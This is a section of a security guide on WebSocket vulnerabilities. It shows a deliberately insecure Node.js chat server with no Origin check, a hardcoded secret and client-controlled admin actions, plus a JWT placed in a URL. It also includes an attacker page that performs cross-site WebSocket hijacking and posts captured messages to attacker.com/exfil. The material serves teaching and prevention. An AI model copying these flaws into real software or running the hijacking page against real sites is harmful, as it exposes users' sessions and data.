---
source: "common/websocket.md"
title: "WebSocket Security Vulnerabilities"
heading: "Vulnerable Code Example (realistic)"
category: "common-vuln"
language: "common"
severity: "high"
tags: [checklist, code, common-vuln, explanation, prevention, secure, vulnerability, vulnerable]
chunk: 4/8
---

## Vulnerable Code Example (realistic)

### Node.js (ws) — CSWSH-prone chat API

```javascript
// server.js — AI-generated "simple chat backend"
const http = require('http');
const WebSocket = require('ws');
const session = require('express-session');

const server = http.createServer(app);
const wss = new WebSocket.Server({ server }); // 🔴 no verifyClient

// Express session cookie is sent automatically on Upgrade from the browser
app.use(session({
  secret: 'dev-secret',
  resave: false,
  saveUninitialized: true,
  cookie: { httpOnly: true, sameSite: 'lax' } // still sent cross-site on WS in many cases
}));

wss.on('connection', (socket, req) => {
  // 🔴 Assumes cookie session is enough; never checks Origin
  const user = getUserFromSession(req); // may be victim user if attacker page opened WS

  socket.on('message', (raw) => {
    // 🔴 No size limit, no schema, no authz on action
    const msg = JSON.parse(raw.toString());
    if (msg.type === 'dm') {
      sendToUser(msg.to, { from: user.id, body: msg.body });
    } else if (msg.type === 'admin_broadcast') {
      // 🔴 Privilege based only on client-supplied type field
      broadcastAll(msg.body);
    }
  });
});

server.listen(3000);
```

### Malicious page (attacker.com)

```html
<script>
  // Victim visits this page while logged into bank.example
  const ws = new WebSocket('wss://bank.example/ws');
  ws.onopen = () => ws.send(JSON.stringify({
    type: 'dm',
    to: 'attacker',
    body: 'steal session context'
  }));
  ws.onmessage = (e) => fetch('https://attacker.com/exfil', {
    method: 'POST', body: e.data
  });
</script>
```

If the bank server does not reject non-allowlisted Origins (or require a non-cookie token), the attack succeeds.

### Browser client with secrets in query string

```javascript
// 🔴 JWT in URL — ends up in access logs, Referer, proxies
const ws = new WebSocket(`ws://api.example.com/stream?token=${localStorage.jwt}`);
```

---